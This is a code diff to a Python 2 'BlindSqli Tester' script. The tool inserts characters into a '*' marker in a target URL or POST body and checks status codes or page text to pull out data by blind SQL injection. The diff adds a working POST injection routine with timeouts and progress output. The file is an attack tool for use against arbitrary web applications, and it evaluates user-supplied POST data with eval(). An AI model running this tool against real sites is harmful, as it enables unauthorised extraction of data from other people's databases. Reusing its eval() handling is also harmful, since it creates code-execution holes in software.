@@ -22,10 +22,11 @@ def getParam():
 			passParam = value
 	if urlParam == "" or typeParam =="" or passParam == "":
 		showUsage()
+	print "URL:"+urlParam
 
 def showUsage():
 	print 'BlindSqli Tester Usage'
-	print sys.argv[0]+' -u URL -d {POST} -t httpCode/sourceCode -p PASSSYMBOL'
+	print sys.argv[0]+' -u URL -d {POST} -t httpCode/sourceCode -p PASS_SYMBOL'
 	sys.exit()
 
 def blindSqli():
@@ -43,25 +44,48 @@ def blindSqli():
 				#change the payload , add achar to it
 				changePayload(aChar)
 				continue
+			else:
+				#this char is not true
+				print ".",
 			#if no pass use symbol to show error
 			noResult = 'true'
 		if noResult == 'true':
 			noResult = 'false'
-			print '\nIt seems over but no more char detected , thx for using'
+			print '\nIt seems over or no more char detected , thx for using'
 			sys.exit()
 		
 
 def postInj(PurlParam,PaChar):
 	global urlParam,dataParam,typeParam,passParam
-	#havn't edit yet
-	return 'pass'
+	postData = eval(dataParam)
+	for name in postData:
+		postData[name] = postData[name].replace('*',PaChar)
+	postDataEnc = urllib.urlencode(postData)
+	req = urllib2.Request(urlParam,postDataEnc)
+
+	if typeParam == "httpCode":
+		httpCode = urllib2.urlopen(req,timeout=8).getcode()
+		if str(passParam) in str(httpCode):
+			return 'pass'
+		else:
+			return 'false'
+
+	if typeParam == "sourceCode":
+		try:
+			sourceCode = urllib2.urlopen(req,timeout=8).read()
+			if str(passParam) in str(sourceCode):
+				return 'pass'
+			else:
+				return 'false'
+		except:
+			print '\nError!'
+			return 'false'
 
 def getInj(PurlParam,PaChar):
 	global urlParam,dataParam,typeParam,passParam
 	testUrl = urlParam.replace('*',PaChar)
-
 	if typeParam == "httpCode":
-		httpCode = urllib.urlopen(testUrl).getcode()
+		httpCode = urllib2.urlopen(testUrl,timeout=8).getcode()
 		if str(passParam) in str(httpCode):
 			return 'pass'
 		else:
@@ -70,18 +94,21 @@ def getInj(PurlParam,PaChar):
 
 	if typeParam == "sourceCode":
 		try:
-			sourceCode = urllib.urlopen(testUrl).read()
+			sourceCode = urllib2.urlopen(testUrl,timeout=8).read()
 			if str(passParam) in str(sourceCode):
 				return 'pass'
 			else:
 				return 'false'
 		except:
-			print '\nERROR '
+			print '\nError!'
 			return 'false'
 
 def changePayload(PaChar):
 	global urlParam,dataParam,typeParam,passParam
-	urlParam = urlParam.replace('*',PaChar+'*')
+	if dataParam == "":
+		urlParam = urlParam.replace('*',PaChar+'*')
+	else:
+		dataParam = dataParam.replace('*',PaChar+'*')
 
 
 getParam()
